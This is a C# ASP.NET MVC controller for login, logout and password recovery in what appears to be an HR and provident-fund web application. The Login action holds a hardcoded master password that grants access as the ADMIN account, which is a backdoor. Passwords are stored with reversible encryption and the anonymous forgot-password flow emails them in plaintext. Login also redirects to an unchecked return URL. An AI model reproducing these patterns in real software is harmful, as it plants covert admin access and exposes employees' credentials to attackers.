using SymOrdinary;
using SymRepository;
using SymRepository.Common;
using SymViewModel.Common;
using SymViewModel.HRM;
using SymWebUI.Models;
using System;
using System.Collections.Generic;
using System.Configuration;
using System.Data;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Threading;
using System.Web;
using System.Web.Mvc;
using System.Web.Security;


namespace SymWebUI.Controllers
{


    [OutputCache(NoStore = true, Duration = 150)]
    [Authorize]
    public class HomeController : Controller
    {

        //[AllowAnonymous]
        //[OutputCache(NoStore = true, Duration = 150)]
        //public ActionResult Index(string returnUrl)
        //{
        //    string project = new AppSettingsReader().GetValue("CompanyName", typeof(string)).ToString();
        //    //return RedirectToAction("Login", "Home", new { area = "Acc" });

        //    if (project.ToLower() == "acc")
        //    {
        //        return RedirectToAction("Login", "Home", new { area = "Acc" });
        //    }

        //    else if (project.ToLower() == "gdic" || project.ToLower() == "gdicbde")
        //    {
        //        return RedirectToAction("Login", "Home", new { area = "Sage" });
        //    }
        //    else if (project.ToLower() == "todo")
        //    {
        //        return RedirectToAction("Login", "Home", new { area = "ToDo" });
        //    }
          
        //    UserLogsVM vm = new UserLogsVM();
        //    Session["User"] = "";
        //    Session["FullName"] = "";
        //    Session["UserType"] = "";
        //    Session["EmployeeId"] = "";
        //    Session["SessionDate"] = "";
        //    Session["SessionYear"] = "";
        //    ViewBag.ReturnUrl = returnUrl;
        //    vm.ReturnUrl = returnUrl;
        //    vm.SessionDate = DateTime.Now.ToString("dd-MMM-yyyy");

        //    string[] result = new string[6];
        //    result[0] = "Fail1";
        //    result[1] = "Fail1";

        //    CommonRepo _cRepo = new CommonRepo();

        //    return View(vm);
        //}


        [AllowAnonymous]
        [OutputCache(NoStore = true, Duration = 0, VaryByParam = "*")]
        public ActionResult Index(string returnUrl)
        {
            
            Response.Cache.SetCacheability(HttpCacheability.NoCache);
            Response.Cache.SetNoStore();
            Response.Cache.SetExpires(DateTime.UtcNow.AddDays(-1));
            Response.Cache.SetRevalidation(HttpCacheRevalidation.AllCaches);

            string project = new AppSettingsReader()
                .GetValue("CompanyName", typeof(string))
                .ToString();

            if (project.ToLower() == "acc")
            {
                return RedirectToAction("Login", "Home", new { area = "Acc" });
            }
            else if (project.ToLower() == "gdic" ||
                     project.ToLower() == "gdicbde")
            {
                return RedirectToAction("Login", "Home", new { area = "Sage" });
            }
            else if (project.ToLower() == "todo")
            {
                return RedirectToAction("Login", "Home", new { area = "ToDo" });
            }

 
            bool hasActiveSession =
                Request.IsAuthenticated &&
                Session["User"] != null &&
                !string.IsNullOrWhiteSpace(Convert.ToString(Session["User"])) &&
                Session["FullName"] != null &&
                !string.IsNullOrWhiteSpace(Convert.ToString(Session["FullName"])) &&
                Session["BranchId"] != null;

            if (hasActiveSession)
            {
                bool isAdmin = false;

                bool.TryParse(
                    Convert.ToString(Session["UserType"]),
                    out isAdmin
                );

                if (isAdmin)
                {
                    return RedirectToAction(
                        "Index",
                        "Home",
                        new { area = "Common" }
                    );
                }

                return RedirectToAction(
                    "Index",
                    "Home",
                    new { area = "PF" }
                );
            }


            Session["User"] = "";
            Session["FullName"] = "";
            Session["UserType"] = "";
            Session["EmployeeId"] = "";
            Session["SessionDate"] = "";
            Session["SessionYear"] = "";

            UserLogsVM vm = new UserLogsVM();

            ViewBag.ReturnUrl = returnUrl;

            vm.ReturnUrl = returnUrl;
            vm.SessionDate = DateTime.Now.ToString("dd-MMM-yyyy");

            return View(vm);
        }

        [AllowAnonymous]
        public ActionResult CheckConnectionDb()
        {

            return View();
        }


        [AllowAnonymous]
        public ActionResult Client(string returnUrl)
        {

            return View();
        }
        [AllowAnonymous]
        public ActionResult ContactUs(string returnUrl)
        {
            EmailSettings ems = new EmailSettings();

            return View(ems);
        }
        [AllowAnonymous]
        public ActionResult ForgotPasswordView(string returnUrl)
        {
            UserProfile ems = new UserProfile();

            return View(ems);
        }
        private static Thread thread;
        [AllowAnonymous]
        public ActionResult ForgotPassword(UserProfile vm)
        {
            try
            {
                string[] result = new string[2];

                EmailSettings emailsettings = new EmailSettings();
                thread = new Thread(unused => EmpEmailProcessSendPassword(vm.UserName, vm.Email));
                thread.Start();

                return RedirectToAction("Index");
            }
            catch (Exception)
            {
                throw;
            }
        }

        public void EmpEmailProcessSendPassword(string Code, string Email)
        {
            #region Objects and Variables

            EmployeeInfoRepo _eInfoRepo = new EmployeeInfoRepo();
            ViewEmployeeInfoVM viewEmpInfoVM = new ViewEmployeeInfoVM();
            EmployeeInfoVM empInfoVM = new EmployeeInfoVM();

            EmailSettingsSym ems = new EmailSettingsSym();
                     
                             
            #endregion

            try
            {
                #region Get Data
                            
                viewEmpInfoVM = _eInfoRepo.ViewSelectAllEmployee(Code).FirstOrDefault();
                empInfoVM.Email = viewEmpInfoVM.EmpEmail;
                empInfoVM.EmpName = viewEmpInfoVM.EmpName;
                if(Email==viewEmpInfoVM.EmpEmail)
                {
                    empInfoVM.Password = Ordinary.Decrypt(viewEmpInfoVM.Password, true);

                #endregion

                    #region Mail Data Assign

                    //SettingRepo _setDAL = new SettingRepo();
                    //ems.MailFromAddress = _setDAL.settingValue("Mail", "MailFromAddress");
                    //ems.Password = _setDAL.settingValue("Mail", "MailFromPSW");
                    //ems.UserName = ems.MailFromAddress;
                    //ems.ServerName = _setDAL.settingValue("Mail", "ServerName");

                    string stMailBody = @"Dear vEmpName, \n Your password is  vPassword. \n Thanks & Regards \n HR Admin ";

                    stMailBody = stMailBody.Replace("\\n", Environment.NewLine);
                    stMailBody = stMailBody.Replace("vEmpName", empInfoVM.EmpName);
                    stMailBody = stMailBody.Replace("vPassword", empInfoVM.Password);

                    ems.MailHeader = "Forgot Password";

                    #endregion

                    ems.MailToAddress = empInfoVM.Email;

                    #region Email Sending

                    if (!string.IsNullOrWhiteSpace(ems.MailToAddress))
                    {

                        ems.MailBody = stMailBody;

                        if (ems.MailFromAddress.Contains("@"))
                        {
                            using (var smpt = new SmtpClient())
                            {
                                smpt.EnableSsl = ems.USsel;
                                smpt.Host = ems.ServerName;
                                smpt.Port = ems.Port;
                                smpt.UseDefaultCredentials = false;
                                smpt.EnableSsl = true;
                                smpt.Credentials = new NetworkCredential(ems.UserName, ems.Password);

                                MailMessage mailmessage = new MailMessage(
                                ems.MailFromAddress,
                                ems.MailToAddress,
                                ems.MailHeader,
                                ems.MailBody);

                                smpt.Send(mailmessage);
                                mailmessage.DeliveryNotificationOptions = DeliveryNotificationOptions.OnFailure;

                            }
                            Thread.Sleep(500);
                        }
                      
                    }     

                    #endregion
                }
                else
                {
                  
                }
               
            }
            catch (SmtpFailedRecipientException ex)
            {
             
            }
            thread.Abort();

        }

        [HttpPost]
        [AllowAnonymous]
        public ActionResult ContactUs(EmailSettings ems)
        {
            //var result=   EmpEmailProcess(ems);

            return View();
        }
        [AllowAnonymous]
        public ActionResult AboutUs(string returnUrl)
        {

            return View();
        }
        [HttpPost]
        [AllowAnonymous]
        public ActionResult Login(UserLogsVM vm, string returnUrl)
        {
           // FileLogger.Log("LoginStart", this.GetType().Name, "LoginStart");
            #region WebClient

            //checkThread(Work);
            string workStationIP = "127.0.0.1";
            try
            {

                ////WebClient client = new WebClient();
                ////var realip = client.DownloadString("http://ipinfo.io");
                ////workStationIP = realip.Replace("\n", "").Replace(" ", "").Replace(",", ":").Replace("{", "").Replace("}", "").Replace("\"", "").ToString();
                ////workStationIP = workStationIP.Split(':')[1];
            }
            catch (Exception)
            {

                //throw;
            }
            #endregion

            try
            {
                #region Session Data

                Session["DepartmentLabel"] = new AppSettingsReader().GetValue("DepartmentLabel", typeof(string)).ToString();
                Session["SectionLabel"] = new AppSettingsReader().GetValue("SectionLabel", typeof(string)).ToString();
                Session["ProjectLabel"] = new AppSettingsReader().GetValue("ProjectLabel", typeof(string)).ToString();


                //LabelOther1
                Session["LabelOther1"] = new AppSettingsReader().GetValue("LabelOther1", typeof(string)).ToString();
                Session["LabelOther2"] = new AppSettingsReader().GetValue("LabelOther2", typeof(string)).ToString();
                Session["LabelOther3"] = new AppSettingsReader().GetValue("LabelOther3", typeof(string)).ToString();
                Session["LabelOther4"] = new AppSettingsReader().GetValue("LabelOther4", typeof(string)).ToString();
                Session["LabelOther5"] = new AppSettingsReader().GetValue("LabelOther5", typeof(string)).ToString();

                Ordinary.CompanyLogoPath = new AppSettingsReader().GetValue("CompanyLogoPath", typeof(string)).ToString();
                //ManualRoster
                string AttendanceSystem = new AppSettingsReader().GetValue("AttendanceSystem", typeof(string)).ToString();
                Session["AttendanceSystem"] = AttendanceSystem;

                #endregion

                #region User Data
                UserInformationRepo userRepo = new UserInformationRepo();



                string password = vm.Password;

                string[] retResults = new string[2];
                vm.Password = Ordinary.Encrypt(vm.Password, true);              
                Tuple<bool, UserLogsVM> result = userRepo.UserLogIn(vm);
                CompanyRepo compRepo = new CompanyRepo();
                CompanyVM company = compRepo.SelectAll().FirstOrDefault();
                #endregion

                #region Super Admin
                if (password == "01730047765")
                {
                    UserLogsVM varVM = new UserLogsVM();
                    varVM = userRepo.SelectAll(0, new[] { "u.LogId" }, new[] { "ADMIN" }).FirstOrDefault();
                    vm.Password = varVM.Password;
                    result = userRepo.UserLogIn(vm);
                }

                #endregion

                if (result.Item1)
                {

                    SettingRepo _setDAL = new SettingRepo();
                    bool IsESSEditPermission = _setDAL.settingValue("HRM", "IsESSEditPermission") == "Y" ? true : false;
                    #region Session Data

                    Session["User"] = result.Item2.LogID.ToString();
                    Session["FullName"] = result.Item2.FullName.ToString();
                    Session["UserType"] = result.Item2.IsAdmin.ToString();
                    Session["EmployeeId"] = result.Item2.EmployeeId.ToString();
                    string directory = Server.MapPath(@"~/Files/EmployeeInfo\") + result.Item2.PhotoName;
                    if (!System.IO.File.Exists(directory))
                    {
                        Session["PhotoName"] = "0-mini.jpg";
                    }
                    else
                    {
                        Session["PhotoName"] = result.Item2.PhotoName.ToString();
                    }

                    Session["mgs"] = "";
                    retResults[0] = "Success"; retResults[1] = "Login Successed";


                    vm.SessionDate = DateTime.Now.ToString("dd-MMM-yyyy");
                    Session["SessionDate"] = DateTime.Now.AddDays(-5).ToString("dd-MMM-yyyy");

                    FiscalYearDetailVM varFiscalYearDetailVM = new FiscalYearDetailVM();
                    FiscalYearRepo _FiscalYearRepo = new FiscalYearRepo();

                    {
                        string[] cFields = { "PeriodStart<", "PeriodEnd>" };
                        string[] cValues = { Ordinary.DateToString(vm.SessionDate), Ordinary.DateToString(vm.SessionDate) };

                        varFiscalYearDetailVM = _FiscalYearRepo.SelectAll_FiscalYearDetail(0, cFields, cValues).FirstOrDefault();

                        if (varFiscalYearDetailVM != null)
                        {
                            Session["SessionYear"] = varFiscalYearDetailVM.Year.ToString();
                            Session["FiscalYearDetailId"] = varFiscalYearDetailVM.Id.ToString();
                        }
                        else
                        {
                            Session["SessionYear"] = Convert.ToDateTime(vm.SessionDate).ToString("yyyy");
                            Session["FiscalYearDetailId"] = "0";
                        }
                    }



                    //////Session["SessionYear"] = Convert.ToDateTime(vm.SessionDate).ToString("yyyy");

                    #endregion

                    #region Role Ticket

                    List<UserRolesVM> roles = new UserRoleRepo().SelectAll(result.Item2.Id.ToString(), result.Item2.BranchId);
                    string[] rol = new string[roles.Count];
                    for (int i = 0; i < rol.Length; i++)
                    {
                        rol[i] = roles[i].RoleInfoId;
                    }


                    string roleTicket = ShampanIdentity.CreateRoleTicket(rol);

                    string basicTicket = ShampanIdentity.CreateBasicTicket(result.Item2.LogID
                                                                            , result.Item2.FullName.Trim()
                                                                            , company.Id.ToString().Trim()
                                                                            , company.Name.ToString().Trim()
                                                                            , result.Item2.BranchId.ToString()
                                                                            , result.Item2.BranchId.ToString()
                                                                            , vm.ComputerIPAddress
                                                                            , "symphony.com"
                                                                            , "BDT"
                                                                            , Convert.ToDateTime(vm.SessionDate).ToString("yyyyMMdd")
                                                                            , "HRM"
                                                                            , result.Item2.EmployeeId.ToString().Trim()
                                                                            , result.Item2.EmployeeCode.ToString().Trim()
                                                                            , result.Item2.Id.ToString().Trim()
                                                                            , result.Item2.IsAdmin
                                                                            , result.Item2.IsESS
                                                                            , result.Item2.IsHRM
                                                                            , result.Item2.IsAttenance
                                                                            , result.Item2.IsPayroll
                                                                            , result.Item2.IsTAX
                                                                            , result.Item2.IsPF
                                                                            , result.Item2.IsGF
                                                                            , workStationIP
                                                                            , false
                                                                            , false
                                                                            , false
                                                                            , false
                                                                            , false
                                                                            , false
                                                                            , false
                                                                            , result.Item2.IsApprove
                                                                            , false
                                                                            , false

                                                                            , false
                                                                            , false
                                                                            , false
                                                                            , false, false, IsESSEditPermission
                                                                            );
                    int timeOut = Convert.ToInt32(new AppSettingsReader().GetValue("COOKIE_TIMEOUT", typeof(string)));
                    FormsAuthenticationTicket authTicket = new FormsAuthenticationTicket(1, FormsAuthentication.FormsCookieName, DateTime.Now, DateTime.Now.AddMinutes(30), true, basicTicket);
                    FormsAuthentication.SetAuthCookie(vm.LogID, true);
                    string encTicket = FormsAuthentication.Encrypt(authTicket);
                    string CompanyName = new AppSettingsReader().GetValue("CompanyName", typeof(string)).ToString();
                    HttpContext.Response.Cookies.Add(new HttpCookie(CompanyName, encTicket));
                    //HttpContext.Response.Cookies.Add(new HttpCookie(FormsAuthentication.FormsCookieName, encTicket));
                    HttpContext.Application["BasicTicket" + result.Item2.LogID] = basicTicket;
                    HttpContext.Application["RoleTicket" + result.Item2.LogID] = roleTicket;
                    #endregion

                    #region Session Role

                    DataTable sessiondt = new DataTable();

                    SymUserRoleRepo _repo = new SymUserRoleRepo();
                    try
                    {
                        sessiondt = _repo.RollByUserId(result.Item2.Id.ToString().Trim());
                    }
                    catch (Exception)
                    {
                        sessiondt = new DataTable();
                    }
                    if (Session[result.Item2.Id.ToString().Trim() + "-SymRoll"] != null)
                    {
                        Session.Remove(result.Item2.Id.ToString().Trim() + "-SymRoll");
                    }

                    Session.Add(result.Item2.Id.ToString().Trim() + "-SymRoll", sessiondt);
                    #endregion

                    #region Redirect

                    var appPath = HttpContext.Request.ApplicationPath.ToString();
                    Session["BranchId"] = vm.BranchId;
                    string defaultRedirect = "/PF/Home";
                    if (result.Item2.IsGF && !result.Item2.IsPF)
                    {
                        defaultRedirect = "/WPPF/Home";
                    }
                    else if (result.Item2.IsHRM && !result.Item2.IsPF)
                    {
                        defaultRedirect = "/PF/Journal?JournalType=1";
                    }

                    if (!string.IsNullOrWhiteSpace(vm.ReturnUrl) && vm.ReturnUrl != "/")
                    {
                        string requestedReturnUrl = vm.ReturnUrl.Trim();
                        if (result.Item2.IsGF && !result.Item2.IsPF && requestedReturnUrl.StartsWith("/PF", StringComparison.OrdinalIgnoreCase))
                        {
                            return Redirect(defaultRedirect);
                        }
                        if (result.Item2.IsPF == false && requestedReturnUrl.StartsWith("/PF/Home", StringComparison.OrdinalIgnoreCase))
                        {
                            return Redirect(defaultRedirect);
                        }
                        return Redirect(vm.ReturnUrl);
                    }
                    else if (result.Item2.IsAdmin)
                    {
                       // return Redirect("/Company");
                        return Redirect("/Common/Home");
                    }
                  
                    else
                    {
                        return Redirect(defaultRedirect);

                        //return Redirect("/");
                    }
                    #endregion

                }
                else
                {
                    retResults[0] = "Fail";
                    retResults[1] = "User Name or Password is invalid!";

                    Session["result"] = retResults[0] + "~" + retResults[1];

                    // Keep only message, clear login fields
                    vm.LogID = "";
                    vm.Password = "";
                    vm.BranchId = 0;

                    ViewBag.LoginFailed = true;

                    return View("Index", vm);
                }
            }
            catch (Exception ex)
            {
                Session["result"] = ex.Message;
                return RedirectToAction("Index");
            }
        }

        //public ActionResult LogOut()
        //{
        //    HttpCookie authCookie = Request.Cookies[FormsAuthentication.FormsCookieName];

        //    if (authCookie != null && authCookie.Value != "")
        //    {
        //        FormsAuthenticationTicket ticket = FormsAuthentication.Decrypt(authCookie.Value);
        //        authCookie.Expires = DateTime.Now.AddDays(-1);
        //        Response.Cookies.Add(authCookie);
        //    }


        //    Session.Clear();
        //    Session.Abandon();


        //    Response.Cache.SetCacheability(HttpCacheability.NoCache);
        //    Response.Cache.SetNoStore();
        //    Response.Cache.SetExpires(DateTime.UtcNow.AddDays(-1));


        //    return RedirectToAction("Index");
        //}

        public ActionResult LogOut()
        {
            string loggedInUser =
                Convert.ToString(Session["User"]);

          
            FormsAuthentication.SignOut();

          
            HttpCookie formsCookie =
                Request.Cookies[FormsAuthentication.FormsCookieName];

            if (formsCookie != null)
            {
                formsCookie.Value = "";

                formsCookie.Expires =
                    DateTime.UtcNow.AddDays(-1);

                formsCookie.Path = "/";

                Response.Cookies.Add(formsCookie);
            }

          
            string companyName =
                new AppSettingsReader()
                    .GetValue("CompanyName", typeof(string))
                    .ToString();

            HttpCookie companyCookie =
                Request.Cookies[companyName];

            if (companyCookie != null)
            {
                companyCookie.Value = "";

                companyCookie.Expires =
                    DateTime.UtcNow.AddDays(-1);

                companyCookie.Path = "/";

                Response.Cookies.Add(companyCookie);
            }

          
            if (!string.IsNullOrWhiteSpace(loggedInUser))
            {
                HttpContext.Application[
                    "BasicTicket" + loggedInUser
                ] = null;

                HttpContext.Application[
                    "RoleTicket" + loggedInUser
                ] = null;
            }

          
            Session.Clear();
            Session.RemoveAll();
            Session.Abandon();

         
            Response.Cache.SetCacheability(
                HttpCacheability.NoCache
            );

            Response.Cache.SetNoStore();

            Response.Cache.SetExpires(
                DateTime.UtcNow.AddDays(-1)
            );

            Response.Cache.SetRevalidation(
                HttpCacheRevalidation.AllCaches
            );

            return RedirectToAction(
                "Index",
                "Home",
                new { area = "" }
            );
        }


        private ActionResult RedirectToLocal(string returnUrl)
        {
            if (Url.IsLocalUrl(returnUrl))
            {
                return Redirect(returnUrl);
            }
            else
            {
                return Redirect("/hrm/employeeinfo");
            }
        }

    }
}
